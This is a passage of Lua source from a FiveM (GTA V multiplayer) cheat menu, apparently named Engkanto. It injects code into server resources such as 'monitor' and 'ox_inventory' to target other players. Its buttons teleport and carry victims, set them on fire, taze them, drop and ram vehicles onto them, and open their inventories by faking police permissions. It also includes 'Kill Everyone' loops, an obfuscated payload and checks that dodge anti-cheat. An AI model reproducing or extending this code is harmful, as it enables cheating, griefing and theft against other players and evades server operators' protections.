                ]], targetServerId)

    MachoInjectThread(0, resName, threadName, scriptToInject)
end)

MachoMenuButton(ServerTabSections[2], "Bug Player V", function()
    local rawId = MachoMenuGetInputbox(PlayerIdInputBoxHandle)
    local targetServerId = tonumber(rawId)
    if not targetServerId then return end

    local resName = "monitor" 
    local threadName = "" 

    local scriptToInject = string.format([[
                    local targetId = %d
                    local myPed = PlayerPedId()
                    local originalCoords = GetEntityCoords(myPed)

                    local targetIdx = GetPlayerFromServerId(targetId)
                    if targetIdx ~= -1 then
                        local targetPed = GetPlayerPed(targetIdx)

                        if DoesEntityExist(targetPed) then
                            for i = 1, 2 do
                                SetEntityVisible(myPed, false, false)
                                SetEntityAlpha(myPed, 0, false)

                                local currentPos = GetEntityCoords(targetPed)
                                SetEntityCoordsNoOffset(myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                Wait(50)

                                ExecuteCommand("carry") 
                                Wait(80)
                                ExecuteCommand("buhat")
                                Wait(80)
                                ExecuteCommand("buhatkita")
                                Wait(50)

                                local offsetX = (i == 1 and 30.0 or -30.0)
                                local movePos = GetEntityCoords(myPed)
                                SetEntityCoordsNoOffset(myPed, movePos.x + offsetX, movePos.y, movePos.z + 15.0, false, false, false)
                                Wait(80)

                                ExecuteCommand("carry") 
                                Wait(80)
                                ExecuteCommand("buhat")
                                Wait(80)
                                ExecuteCommand("buhatkita")
                                Wait(150)

                                NetworkRequestControlOfEntity(targetPed)
                                local timeout = 0
                                while not NetworkHasControlOfEntity(targetPed) and timeout < 20 do
                                    NetworkRequestControlOfEntity(targetPed)
                                    Wait(10)
                                    timeout = timeout + 1
                                end
                                DetachEntity(targetPed, true, true)

                                Wait(100)
                                SetEntityCoordsNoOffset(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                SetEntityVisible(myPed, true, false)
                                ResetEntityAlpha(myPed)
                                Wait(80)
                            end

                            SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, false)
                            SetEntityVisible(myPed, true, false)
                            ResetEntityAlpha(myPed)
                        end
                    end
                ]], targetServerId)

    MachoInjectThread(0, resName, threadName, scriptToInject)
end)

MachoMenuButton(ServerTabSections[2], "Bring Player", function()
    local rawId = MachoMenuGetInputbox(PlayerIdInputBoxHandle)
    local targetServerId = tonumber(rawId)
    if not targetServerId then return end
    local targetResources = {"monitor"} 
    for _, resName in ipairs(targetResources) do
        if MachoResourceInjectable(resName) then
            MachoInjectThread(0, resName, "", [[
    local targetId = ]] .. targetServerId .. [[
    local myPed = PlayerPedId()
    local myPos = GetEntityCoords(myPed) 
    
    local targetPed = 0
    for _, player in ipairs(GetActivePlayers()) do
        if GetPlayerServerId(player) == targetId then
            targetPed = GetPlayerPed(player)
            break
        end
    end

    if targetPed ~= 0 and DoesEntityExist(targetPed) then
        
        SetEntityVisible(myPed, false, false)
        SetEntityAlpha(myPed, 0, false)
        
        SetEntityCoords(myPed, GetEntityCoords(targetPed), false, false, false, false)
        Citizen.Wait(200)

        ExecuteCommand("carry")
         Wait(100)
        ExecuteCommand("buhat")
         Wait(100)
        ExecuteCommand("buhatkita")
        Wait(100)

        if not IsEntityAttachedToEntity(targetPed, myPed) then
            ExecuteCommand("piggyback")
            Citizen.Wait(100)
        end
        
        if IsEntityAttachedToEntity(targetPed, myPed) then
            SetEntityCoords(myPed, myPos.x, myPos.y, myPos.z, false, false, false, false)
            Citizen.Wait(300)

            ExecuteCommand("carry")
             Wait(100)
            ExecuteCommand("buhat")
             Wait(100)
            ExecuteCommand("buhatkita")
            Wait(100)
             
            NetworkRequestControlOfEntity(targetPed)
            DetachEntity(targetPed, true, true)
            ClearPedTasksImmediately(targetPed)
            SetPedToRagdoll(targetPed, 5000, 5000, 0, 0, 0, 0)
        end
        
        SetEntityVisible(myPed, true, false)
        ResetEntityAlpha(myPed)
    end
]])
        end
    end
end)

MachoMenuButton(ServerTabSections[2], "Set Fire On Player", function()
    local inputId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    local selPlayer = MachoMenuGetSelectedPlayer()
    local targetServerId = (inputId and inputId > 0) and inputId or selPlayer

    if not targetServerId or targetServerId == 0 or targetServerId == "" then 
        return 
    end

    MachoInjectResource2(3, "monitor", string.format([[
        local rT = %d
        local tP = 0
        local me = GetPlayerPed(-1) 
        
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT or p == rT then 
                tP = GetPlayerPed(p) 
                break 
            end
        end

        if tP ~= 0 and DoesEntityExist(tP) then
            local twin = ClonePed(tP, GetEntityHeading(tP), true, false)
            
            if DoesEntityExist(twin) then
                local coords = GetEntityCoords(tP)
                local forward = GetEntityForwardVector(tP)
                local headCoords = GetPedBoneCoords(tP, 31086, 0.0, 0.0, 0.0)

                SetEntityCoords(twin, coords.x + (forward.x * 1.0), coords.y + (forward.y * 1.0), coords.z + 0.5, false, false, false, true)
                SetEntityVisible(twin, false, false)
                SetEntityAlpha(twin, 0, false)
                SetEntityCollision(twin, true, true)
                
                local wH = 0x24B17070
                GiveWeaponToPed(twin, wH, 1, false, true)
                SetCurrentPedWeapon(twin, wH, true)

                ShootSingleBulletBetweenCoords(
                    coords.x + (forward.x * 0.9), coords.y + (forward.y * 0.9), coords.z + 0.6, 
                    headCoords.x, headCoords.y, headCoords.z, 
                    200,    
                    true,   
                    wH,     
                    me,    
                    true,  
                    false, 
                    1000.0  
                )

                
                Citizen.SetTimeout(500, function()
                    if DoesEntityExist(twin) then DeleteEntity(twin) end
                end)
            end
        end
    ]], targetServerId))
end)

MachoMenuButton(ServerTabSections[2], "Ragdoll Player", function()
    -- 1. Targeting Logic
    local inputId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    local selPlayer = MachoMenuGetSelectedPlayer()
    local targetServerId = (inputId and inputId > 0) and inputId or selPlayer

    if not targetServerId or targetServerId == 0 or targetServerId == "" then 
        return 
    end

    -- 2. Injection Logic
    MachoInjectResource2(3, "monitor", string.format([[
        local rT = %d
        local modelHash = GetHashKey("sultan")
        local tP = 0
        
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT or p == rT then 
                tP = GetPlayerPed(p) 
                break 
            end
        end

        if tP ~= 0 and DoesEntityExist(tP) then
            Citizen.CreateThread(function()
                RequestModel(modelHash)
                local wait = 0
                while not HasModelLoaded(modelHash) and wait < 50 do Wait(10) wait = wait + 1 end

                if HasModelLoaded(modelHash) then
                    local coords = GetEntityCoords(tP)
                    
                    -- Spawn ng networked vehicle para ramdam ng target
                    local veh = CreateVehicle(modelHash, coords.x, coords.y, coords.z + 10.5, GetEntityHeading(tP), true, true)
                    
                    if DoesEntityExist(veh) then
                        -- [ ANTI-TUMAGOS SETTINGS ]
                        SetEntityAsMissionEntity(veh, true, true)
                        NetworkRegisterEntityAsNetworked(veh)
                        SetNetworkIdCanMigrate(VehToNet(veh), true)
                        
                        -- Force Collision laban sa Ped ng target
                        SetEntityCollision(veh, true, true) 
                        SetEntityVisible(veh, false, false)
                        SetEntityAlpha(veh, 0, false)
                        
                        -- Physics Boost
                        ActivatePhysics(veh)
                        SetEntityVelocity(veh, 0.0, 0.0, -50.0) -- Mas mabilis na bagsak para hindi tumagos
                        
                        -- Hayaan ang physics na mag-calculate bago burahin
                        local timer = GetGameTimer()
                        while GetGameTimer() - timer < 300 do 
                            Wait(0)
                            -- Paulit-ulit na i-set ang collision habang nahuhulog
                            SetEntityCollision(veh, true, true) 
                        end

                        if DoesEntityExist(veh) then 
                            DeleteVehicle(veh) 
                            SetEntityAsNoLongerNeeded(veh)
                        end
                    end
                    SetModelAsNoLongerNeeded(modelHash)
                end
            end)
        end
    ]], targetServerId))
end)

MachoMenuButton(ServerTabSections[2], "Taze Player", function()
    local inputId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    local selPlayer = MachoMenuGetSelectedPlayer()
    local targetServerId = (inputId and inputId > 0) and inputId or selPlayer

    if not targetServerId or targetServerId == 0 or targetServerId == "" then 
        return 
    end

    MachoInjectResource2(3, "any", string.format([[
        local rT = %d
        local tP = 0
        
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT or p == rT then 
                tP = GetPlayerPed(p) 
                break 
            end
        end

        if tP ~= 0 and DoesEntityExist(tP) then
            local twin = ClonePed(tP, GetEntityHeading(tP), true, false)
            
            if DoesEntityExist(twin) then
                local coords = GetEntityCoords(tP)
                local forward = GetEntityForwardVector(tP)
                
                SetEntityCoords(twin, coords.x - (forward.x * 2.0), coords.y - (forward.y * 2.0), coords.z, false, false, false, true)
                
                SetEntityVisible(twin, false, false)
                SetEntityAlpha(twin, 0, false)
                SetEntityInvincible(twin, true)
                SetEntityCollision(twin, true, true) 
                SetBlockingOfNonTemporaryEvents(twin, true)
                
                local wH = GetHashKey("WEAPON_STUNGUN")
                GiveWeaponToPed(twin, wH, 999, false, true)
                SetCurrentPedWeapon(twin, wH, true)
                
                SetPedAccuracy(twin, 100)
                ClearPedTasksImmediately(twin)
                TaskShootAtEntity(twin, tP, 3000, 0xCC14B251)

                Citizen.SetTimeout(3500, function()
                    if DoesEntityExist(twin) then DeleteEntity(twin) end
                end)
            end
        end
    ]], targetServerId))
end)

MachoMenuButton(ServerTabSections[2], "Steal Inventory", function()

    local inputId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    
    if not inputId or inputId == 0 then return end

    MachoInjectResource2(3, "ox_inventory", string.format([[
        local tid = %d
        local myPed = PlayerPedId()
        
        local targetPlayer = -1
        local pList = GetActivePlayers()
        for i=1, #pList do
            if GetPlayerServerId(pList[i]) == tid then 
                targetPlayer = pList[i] 
                break 
            end
        end

        if targetPlayer ~= -1 then
            local tPed = GetPlayerPed(targetPlayer)
            local oldPos = GetEntityCoords(myPed)
            local oldHead = GetEntityHeading(myPed)
            local tPos = GetEntityCoords(tPed)
            local tForward = GetEntityForwardVector(tPed)

            SetEntityCoords(myPed, tPos.x - (tForward.x * 0.8), tPos.y - (tForward.y * 0.8), tPos.z - 1.0, false, false, false, false)
            SetEntityVisible(myPed, false, false)
            SetEntityAlpha(myPed, 0, false)
            SetEntityInvincible(myPed, true)
            FreezeEntityPosition(myPed, true)

            Wait(450)

            local PD = PlayerData or _G.PlayerData
            if PD then
                local oldGroups = PD.groups
                PD.groups = { ["police"] = 1 } 
                
                exports.ox_inventory:openInventory('player', tid)

                Citizen.CreateThread(function()
                    while IsNuiFocused() do Wait(500) end
                    
                    SetEntityCoords(myPed, oldPos.x, oldPos.y, oldPos.z, false, false, false, false)
                    SetEntityHeading(myPed, oldHead)
                    SetEntityVisible(myPed, true, false)
                    ResetEntityAlpha(myPed)
                    SetEntityInvincible(myPed, false)
                    FreezeEntityPosition(myPed, false)
                    
                    PD.groups = oldGroups
                end)
            end
        end
    ]], inputId))
end)

MachoMenuButton(ServerTabSections[2], "Drop Car", function()
    local tId = MachoMenuGetSelectedPlayer()
    if not tId or tId == 0 or tId == "" then
        tId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    end
    if not tId or tId == 0 then return end
    
    MachoInjectResource2(3, "monitor", string.format([[
        local rT, mH, tP = %d, GetHashKey("jugular"), 0
        
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT or p == rT then tP = GetPlayerPed(p) break end
        end
        
        if tP ~= 0 and DoesEntityExist(tP) then
            RequestModel(mH)
            local t = 0
            while not HasModelLoaded(mH) and t < 100 do Wait(1) t = t + 1 end
            
            if HasModelLoaded(mH) then
                for i = 1, 10 do 
                    if DoesEntityExist(tP) then
                        local pos = GetEntityCoords(tP)
                        local veh = CreateVehicle(mH, pos.x, pos.y, pos.z + 30.0, 0.0, true, true)
                        
                        if DoesEntityExist(veh) then
                            SetEntityAsMissionEntity(veh, true, true)
                            
                            ApplyForceToEntity(veh, 5, 0.0, 0.0, -100.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                            
                            Citizen.SetTimeout(5000, function()
                                if DoesEntityExist(veh) then
                                    DeleteVehicle(veh)
                                end
                            end)
                        end
                    end
                    Wait(200) 
                end
                SetModelAsNoLongerNeeded(mH)
            end
        end
    ]], tId))
end)

MachoMenuButton(ServerTabSections[2], "Drop Car (Aggresive)", function()
    local tId = MachoMenuGetSelectedPlayer()
    if not tId or tId == 0 or tId == "" then
        tId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    end
    if not tId or tId == 0 then return end
    
    MachoInjectResource2(3, "monitor", string.format([[
        local rT, mH, tP = %d, GetHashKey("jugular"), 0
        
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT or p == rT then tP = GetPlayerPed(p) break end
        end
        
        if tP ~= 0 and DoesEntityExist(tP) then
            RequestModel(mH)
            local t = 0
            while not HasModelLoaded(mH) and t < 100 do Wait(1) t = t + 1 end
            
            if HasModelLoaded(mH) then
                for i = 1, 10 do 
                    if DoesEntityExist(tP) then
                        local pos = GetEntityCoords(tP)
                        local veh = CreateVehicle(mH, pos.x, pos.y, pos.z + 30.0, 0.0, true, true)
                        
                        if DoesEntityExist(veh) then
                            SetEntityAsMissionEntity(veh, true, true)
                            
                            ApplyForceToEntity(veh, 1, 0.0, 0.0, -100.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                            
                            Citizen.SetTimeout(5000, function()
                                if DoesEntityExist(veh) then
                                    DeleteVehicle(veh)
                                end
                            end)
                        end
                    end
                    Wait(200) 
                end
                SetModelAsNoLongerNeeded(mH)
            end
        end
    ]], tId))
end)

MachoMenuButton(ServerTabSections[2], "Ram Player", function()
    local targetId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    if targetId and targetId > 0 then
        MachoInjectResource('monitor', string.format([[
            local playerId = GetPlayerFromServerId(%d)
                if playerId then
                    local targetPed = GetPlayerPed(playerId)
                    local targetCoords = GetEntityCoords(targetPed)
                    local offset = GetOffsetFromEntityInWorldCoords(targetPed, 0, -2.0, 0)
                    local vehModel = "sultan"
                    RequestModel(vehModel)
                    while not HasModelLoaded(vehModel) do
                        Citizen.Wait(0)
                    end
                    local vehicle = CreateVehicle(vehModel, offset.x, offset.y, offset.z, GetEntityHeading(targetPed), true, true)
                    SetEntityVisible(vehicle, true, true)
                    if DoesEntityExist(vehicle) then
                        NetworkRequestControlOfEntity(vehicle)
                        SetVehicleDoorsLocked(vehicle, 4)
                        SetVehicleForwardSpeed(vehicle, 140.0)
                    end
                    TriggerEvent('chat:addMessage', { args = { '^2Vehicle System:', 'Vehicle launched! Target ID: %d' } })
                else
                    TriggerEvent('chat:addMessage', { args = { '^1Vehicle System:', 'Player not found! ID: %d' } })
                end
            ]], targetId, targetId, targetId))
            MachoMenuNotification("Engkanto", "Ram Player initiated! Target ID: " .. targetId)
        else
            MachoMenuNotification("Engkanto", "Please enter a valid player ID!")
        end
    end)

MachoMenuButton(ServerTabSections[2], "Ram Player II", function()
    local targetId = MachoMenuGetSelectedPlayer()
    if not targetId or targetId == 0 or targetId == "" then
        targetId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    end
    MachoInjectResource2(3, "monitor", string.format([[
        local rT, vH, tP = %d, GetHashKey("jugular"), 0
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT or p == rT then tP = GetPlayerPed(p) break end
        end
        if tP ~= 0 and DoesEntityExist(tP) then
            RequestModel(vH)
            local t = 0
            while not HasModelLoaded(vH) and t < 50 do Wait(1) t = t + 1 end
            if HasModelLoaded(vH) then
                local pP = GetEntityCoords(tP)
                local fV = GetEntityForwardVector(tP)
                local sP = pP + (fV * -15.0) 
                local veh = CreateVehicle(vH, sP.x, sP.y, sP.z + 0.5, 0.0, true, false)
                if DoesEntityExist(veh) then
                    local tV = pP - sP
                    local mag = math.sqrt(tV.x^2 + tV.y^2 + tV.z^2)
                    local dir = {x = tV.x/mag, y = tV.y/mag, z = tV.z/mag}
                    local speed = 60.0
                    SetEntityVelocity(veh, dir.x * speed, dir.y * speed, dir.z * speed)
                    SetEntityAsMissionEntity(veh, true, true)
                    Citizen.CreateThread(function()
                        Wait(2000)
                        if DoesEntityExist(veh) then DeleteEntity(veh) end
                    end)
                end
                SetModelAsNoLongerNeeded(vH)
            end
        end
    ]], targetId, selectedCar))
end)

MachoMenuText(ServerTabSections[2], "Attach Trolls")
local ObjectInputBoxHandle = MachoMenuInputbox(ServerTabSections[2], "Object Model","prop_name")

MachoMenuButton(ServerTabSections[2], "Spawn Object On Player", function()
    local targetServerId = MachoMenuGetSelectedPlayer()
    if not targetServerId or targetServerId == 0 or targetServerId == "" then
        targetServerId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    end
    
    local propModel = MachoMenuGetInputbox(ObjectInputBoxHandle)
    if not targetServerId or targetServerId == 0 or not propModel or propModel == "" then return end

    MachoInjectResource("monitor", string.format([[  
        Citizen.CreateThread(function()
            local propHash = GetHashKey("%s")
            if not IsModelInCdimage(propHash) then return end
            RequestModel(propHash)
            local timeout = 0
            while not HasModelLoaded(propHash) and timeout < 50 do
                Wait(10)
                timeout = timeout + 1
            end
            local hasTrapped = false
            while not hasTrapped do
                Citizen.Wait(100)
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == %d then
                        local ped = GetPlayerPed(player)
                        if DoesEntityExist(ped) then
                            local coords = GetEntityCoords(ped)
                            local prop = CreateObject(propHash, coords.x, coords.y, coords.z - 1.0, true, true, false)
                            FreezeEntityPosition(prop, true)
                            hasTrapped = true
                        end
                        break
                    end
                end
                if not hasTrapped then break end
            end
            SetModelAsNoLongerNeeded(propHash)
        end)
    ]], propModel, targetServerId))
end)

MachoMenuButton(ServerTabSections[2], "Attach Prop", function()
    local targetServerId = MachoMenuGetSelectedPlayer()
    if not targetServerId or targetServerId == 0 or targetServerId == "" then
        targetServerId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    end
    
    local customProp = MachoMenuGetInputbox(ObjectInputBoxHandle) 
    if not targetServerId or targetServerId == 0 or not customProp or customProp == "" then return end

    MachoInjectResource2(3, "monitor", string.format([[
        local rT, mH, tP = %d, GetHashKey("%s"), 0
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT or p == rT then tP = GetPlayerPed(p) break end
        end
        if tP ~= 0 and DoesEntityExist(tP) then
            if IsModelInCdimage(mH) then
                RequestModel(mH)
                local t = 0
                while not HasModelLoaded(mH) and t < 50 do Wait(1) t = t + 1 end
                if HasModelLoaded(mH) then
                    local coords = GetEntityCoords(tP)
                    local obj = CreateObject(mH, coords.x, coords.y, coords.z, true, true, false)
                    if DoesEntityExist(obj) then
                        AttachEntityToEntity(obj, tP, GetPedBoneIndex(tP, 31086), 0.0, 0.0, 0.2, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                        SetModelAsNoLongerNeeded(mH)
                        SetEntityAsNoLongerNeeded(obj)
                    end
                end
            end
        end
    ]], targetServerId, customProp))
end)

MachoMenuButton(ServerTabSections[2], "Attach Monkey Mask To Player", function()
    if GetResourceState("WaveShield") == "started" then
        MachoMenuNotification("Engkanto", "WaveShield Detected!")
        return
    end

    if GetResourceState("ReaperV4") == "started" then
        MachoMenuNotification("Engkanto", "ReaperV4 Detected!")
        return
    end

    -- בדיקה של Macho Player List או ID ידני
    local selectedPlayerClientId = MachoMenuGetSelectedPlayer()
    local manualId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    local targetServerId = nil

    if selectedPlayerClientId and selectedPlayerClientId >= 0 then
        targetServerId = GetPlayerServerId(selectedPlayerClientId)
    elseif manualId and manualId > 0 then
        targetServerId = manualId
    else
        MachoMenuNotification("Engkanto", "Enter a valid Player ID or select!")
        return
    end

    -- מבצעים את ההזרקה
    MachoInjectResourceRaw('monitor', [[
        local targetServerId = ]] .. targetServerId .. [[

        local function GetTargetPlayer()
            for _, playerId in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(playerId) == targetServerId then
                    return playerId
                end
            end
            return -1
        end

        local function attachMaskToPlayer(ped)
            if not DoesEntityExist(ped) then return false end

            local maskModel = 'p_orleans_mask_s' -- Specific monkey mask prop
            RequestModel(maskModel)
            while not HasModelLoaded(maskModel) do
                Citizen.Wait(100)
            end

            local coords = GetEntityCoords(ped)
            local maskObj = CreateObject(maskModel, coords.x, coords.y, coords.z, true, true, false)
            NetworkRequestControlOfEntity(maskObj)

            AttachEntityToEntity(
                maskObj, 
                ped, 
                GetPedBoneIndex(ped, 31086), -- Head bone
                0.0, 0.025, 0.0,   -- Position
                180.0, 90.0, 0.0,  -- Rotation
                true, false, false, false, 2, true
            )

            SetModelAsNoLongerNeeded(maskModel)
            return true
        end

        CreateThread(function()
            local targetPlayer = GetTargetPlayer()
            if targetPlayer ~= -1 then
                local targetPed = GetPlayerPed(targetPlayer)
                attachMaskToPlayer(targetPed)
            end
        end)
    ]])

    -- ההודעה מוצגת מיידית אחרי ההזרקה
    MachoMenuNotification("Engkanto", "Monkey mask to player ID: " .. targetServerId)
    
end)

MachoMenuButton(ServerTabSections[2], "Attach Monitor To Player", function()
    if GetResourceState("WaveShield") == "started" then
        MachoMenuNotification("Engkanto", "WaveShield Detected!")
        return
    end

    if GetResourceState("ReaperV4") == "started" then
        MachoMenuNotification("Engkanto", "ReaperV4 Detected!")
        return
    end

    -- בדיקה של Macho Player List או ID ידני
    local selectedPlayerClientId = MachoMenuGetSelectedPlayer()
    local manualId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
    local targetServerId = nil

    if selectedPlayerClientId and selectedPlayerClientId >= 0 then
        targetServerId = GetPlayerServerId(selectedPlayerClientId)
    elseif manualId and manualId > 0 then
        targetServerId = manualId
    else
        MachoMenuNotification("Engkanto", "Enter a valid Player ID or select!")
        return
    end

    -- מבצעים את ההזרקה
    MachoInjectResourceRaw('monitor', [[
        local targetServerId = ]] .. targetServerId .. [[

        local function GetTargetPlayer()
            for _, playerId in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(playerId) == targetServerId then
                    return playerId
                end
            end
            return -1
        end

        local function attachMaskToPlayer(ped)
            if not DoesEntityExist(ped) then return false end

            local maskModel = GetHashKey("v_res_monitor")
            RequestModel(maskModel)
            local startTime = GetGameTimer()
            local timeout = 5000

            while not HasModelLoaded(maskModel) do
                Citizen.Wait(100)
                if GetGameTimer() - startTime > timeout then
                    SetModelAsNoLongerNeeded(maskModel)
                    return false
                end
            end

            local coords = GetEntityCoords(ped)
            local maskObj = CreateObject(maskModel, coords.x, coords.y, coords.z, true, true, false)
            if not DoesEntityExist(maskObj) then
                SetModelAsNoLongerNeeded(maskModel)
                return false
            end

            local networkTimeout = 3000
            startTime = GetGameTimer()
            while not NetworkHasControlOfEntity(maskObj) do
                NetworkRequestControlOfEntity(maskObj)
                Citizen.Wait(100)
                if GetGameTimer() - startTime > networkTimeout then
                    SetModelAsNoLongerNeeded(maskModel)
                    return false
                end
            end

            AttachEntityToEntity(
                maskObj,
                ped,
                GetPedBoneIndex(ped, 31086),
                0.140, 0.025, 0.0,
                180.0, 90.0, 0.0,
                true, false, false, false, 2, true
            )

            SetModelAsNoLongerNeeded(maskModel)
            return true
        end

        CreateThread(function()
            local targetPlayer = GetTargetPlayer()
            if targetPlayer ~= -1 then
                local targetPed = GetPlayerPed(targetPlayer)
                attachMaskToPlayer(targetPed)
            end
        end)
    ]])

    -- ההודעה מוצגת מיידית אחרי ההזרקה
    MachoMenuNotification("Engkanto", "Monitor head to player ID: " .. targetServerId)
end)

MachoMenuText(ServerTabSections[2], "Global Trolls")

local CarModelInput = MachoMenuInputbox(ServerTabSections[2], "Enter Car Models", "jugular,neon,sunrise,tug")

MachoMenuCheckbox(ServerTabSections[2], "Kill Everyone", 
function()
        enableDamageLoop = true
        CreateThread(function()
            while enableDamageLoop do
                local targetResource = nil
                local resourcePriority = {"fiveguard", "monitor"}
                local foundResources = {}
                
                for _, resourceName in ipairs(resourcePriority) do
                    if GetResourceState(resourceName) == "started" then
                        table.insert(foundResources, resourceName)
                    end
                end
                
                if #foundResources > 0 then
                    targetResource = foundResources[math.random(1, #foundResources)]
                else
                    local allResources = {}
                    for i = 0, GetNumResources() - 1 do
                        local resourceName = GetResourceByFindIndex(i)
                        if resourceName and GetResourceState(resourceName) == "started" then
                            table.insert(allResources, resourceName)
                        end
                    end
                    if #allResources > 0 then
                        targetResource = allResources[math.random(1, #allResources)]
                    end
                end
                
                if targetResource then
                        local myPed = PlayerPedId()
                        local currentWeapon = GetSelectedPedWeapon(myPed)
                        
                        if currentWeapon and currentWeapon ~= GetHashKey("weapon_unarmed") then
                            local weaponDamage = GetWeaponDamage(currentWeapon, 0)
                            
                            SetWeaponRecoilShakeAmplitude(currentWeapon, 0.0)
                            SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                            
                            for _, playerId in ipairs(GetActivePlayers()) do
                                if playerId ~= PlayerId() then
                                    local targetPed = GetPlayerPed(playerId)
                                    if DoesEntityExist(targetPed) and not IsEntityDead(targetPed) then
                                        SetEntityInvincible(targetPed, false)
                                        SetEntityCanBeDamaged(targetPed, true)
                                        SetEntityProofs(targetPed, false, false, false, false, false, false, false, false)
                                        
                                        local headBone = GetPedBoneIndex(targetPed, 31086)
                                        local headCoords = GetWorldPositionOfEntityBone(targetPed, headBone)
                                        
                                        if headCoords.x == 0.0 and headCoords.y == 0.0 and headCoords.z == 0.0 then
                                            headCoords = GetEntityCoords(targetPed)
                                            headCoords = vector3(headCoords.x, headCoords.y, headCoords.z + 0.6)
                                        end
                                        
                                        local startCoords = vector3(headCoords.x + 1.5, headCoords.y, headCoords.z)
                                        
                                        ShootSingleBulletBetweenCoords(
                                            startCoords.x, startCoords.y, startCoords.z,
                                            headCoords.x, headCoords.y, headCoords.z,
                                            weaponDamage,
                                            true,
                                            currentWeapon,
                                            myPed,
                                            true,
                                            true,
                                            3000.0
                                        )
                                    end
                                end
                            end
                        end
                end
                
                Wait(100)
            end
        end)
    end,
    function()
        enableDamageLoop = false
    end
)

MachoMenuCheckbox(ServerTabSections[2], "Kill Everyone II", function()

    local playerPed = PlayerPedId()
    local oldCoords = GetEntityCoords(playerPed)

    -- Görünmez yap
    SetEntityVisible(playerPed, false, false)

    -- Silah spawnlama
    GiveWeaponToPed(playerPed, GetHashKey("WEAPON_ASSAULTRIFLE"), 9999, false, true)
    SetCurrentPedWeapon(playerPed, GetHashKey("WEAPON_ASSAULTRIFLE"), true)
    SetPedInfiniteAmmo(playerPed, true, GetHashKey("WEAPON_ASSAULTRIFLE"))
    SetPedCurrentWeaponVisible(playerPed, false, false, false, true)

    Citizen.CreateThread(function()
        for _, player in ipairs(GetActivePlayers()) do
            local targetPed = GetPlayerPed(player)

            if targetPed ~= playerPed and DoesEntityExist(targetPed) then
                local targetCoords = GetEntityCoords(targetPed)
                local distance = #(targetCoords - oldCoords)

                if distance <= 500.0 then
                    -- Yanına ışınlan
                    SetEntityCoords(playerPed, targetCoords.x, targetCoords.y, targetCoords.z + 1.0, false, false, false, false)

                    -- Hasar ver + kurşun efekti
                    for i = 1, 5 do
                        ApplyDamageToPed(targetPed, 200, false)
                        ShootSingleBulletBetweenCoords(
                            targetCoords.x, targetCoords.y, targetCoords.z + 0.1,
                            targetCoords.x, targetCoords.y, targetCoords.z + 0.2,
                            250,
                            0,
                            GetHashKey("WEAPON_APPISTOL"),
                            playerPed,
                            true,
                            false,
                            -1.0
                        )
                        Citizen.Wait(50)
                    end

                    Citizen.Wait(150)
                end
            end
        end

        -- Temizlik
        RemoveWeaponFromPed(playerPed, GetHashKey("WEAPON_ASSAULTRIFLE"))
        SetEntityVisible(playerPed, true, false)
        SetEntityCoords(playerPed, oldCoords.x, oldCoords.y, oldCoords.z, false, false, false, false)
    end)
end)

MachoMenuCheckbox(ServerTabSections[2], "Kill Everyone III", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if aSwDeFgHiJkLoPx == nil then aSwDeFgHiJkLoPx = false end
        aSwDeFgHiJkLoPx = true

        local function pLoMkIjUhbGyTf()
            local mAxPlErOy = PlayerPedId()
            local rVtNiUcEx = GetHashKey("WEAPON_ASSAULTRIFLE")
            local gBvTnCuXe = 100
            local aSdFgHjKl = 1000.0
            local lKjHgFdSa = 300.0

            local nBxMzLqPw = CreateThread
            local qWeRtYuiOp = ShootSingleBulletBetweenCoords

            nBxMzLqPw(function()
                while aSwDeFgHiJkLoPx and not Unloaded do
                    Wait(gBvTnCuXe)
                    local bNmZxSwEd = GetActivePlayers()
                    local jUiKoLpMq = GetEntityCoords(mAxPlErOy)

                    for _, wQaSzXedC in ipairs(bNmZxSwEd) do
                        local zAsXcVbNm = GetPlayerPed(wQaSzXedC)
                        if zAsXcVbNm ~= mAxPlErOy and DoesEntityExist(zAsXcVbNm) and not IsPedDeadOrDying(zAsXcVbNm, true) then
                            local eDxCfVgBh = GetEntityCoords(zAsXcVbNm)
                            if #(eDxCfVgBh - jUiKoLpMq) <= lKjHgFdSa then
                                local xScVbNmAz = vector3(
                                    eDxCfVgBh.x + (math.random() - 0.5) * 0.8,
                                    eDxCfVgBh.y + (math.random() - 0.5) * 0.8,
                                    eDxCfVgBh.z + 1.2
                                )

                                local dFgHjKlZx = vector3(
                                    eDxCfVgBh.x,
                                    eDxCfVgBh.y,
                                    eDxCfVgBh.z + 0.2
                                )

                                qWeRtYuiOp(
                                    xScVbNmAz.x, xScVbNmAz.y, xScVbNmAz.z,
                                    dFgHjKlZx.x, dFgHjKlZx.y, dFgHjKlZx.z,
                                    aSdFgHjKl,
                                    true,
                                    rVtNiUcEx,
